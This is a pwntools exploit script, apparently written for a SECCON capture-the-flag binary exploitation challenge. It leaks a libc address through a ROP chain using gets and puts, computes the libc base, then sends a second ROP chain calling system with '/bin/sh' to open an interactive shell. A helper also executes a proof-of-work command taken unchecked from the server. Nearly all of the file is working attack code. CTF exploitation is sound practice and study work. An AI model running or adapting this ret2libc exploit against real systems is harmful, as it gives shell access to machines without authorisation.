from pwn import *
context.log_level = 'error'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'mrga.seccon.games'
PORT =  7428
HOST = '0'
PORT =  7428

elf = ELF(TARGET)
def start():
    if not args.R:
        #print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def solve_pow():
    r.recvuntil(b'\n')
    cmd = r.recvuntil(b'\n', True)
    import subprocess
    p = log.progress('solving pow ...')
    ret = subprocess.run(cmd.split(b' '), capture_output=True)
    cmd1 = cmd.split(b'|')[0].split(b' ')[:-1]
    cmd2 = cmd.split(b'|')[1].split(b' ')[1:]
    print(f'{cmd1 = }')
    print(f'{cmd2 = }')
    ret1 = subprocess.Popen(cmd1, stdout=PIPE)
    ret2 = subprocess.Popen(cmd2, stdin = ret1.stdout, stdout=PIPE)
    output = ret2.communicate()[0]
    p.success('done.')
    print(f'debug: {output}')
    resp = output[:-1]
    r.sendlineafter(b'solution: ', resp)


rbp = 0x004011e9

r = start()
#if args.R:
    #solve_pow()
payload = b''
payload += flat(0x11, 0x22, 0x4040f0, elf.plt.gets, elf.plt.gets,elf.plt.puts, elf.sym.main+5)

if args.D:
    debug(r, [0x11d4])

r.sendlineafter(b'>\n', payload)

r.sendline(p32(0)+b'aaaa')
r.sendline(b'aaaa')

r.recvuntil(b'aaaa')
r.recv(4)
leak = u64(r.recv(6)+b'\x00\x00')
print(f'{leak = :#x}')
base = leak + 0x28c0
print(f'{base = :#x}')
system = base + 0x58740
binsh = base + 0x1cb42f
rdi = base + 0x001ae710

payload = b''
payload += flat(0x11, 0x22, 0x4040f0, rdi, binsh, system)
r.sendlineafter(b'>\n', payload)

r.interactive()
r.close()

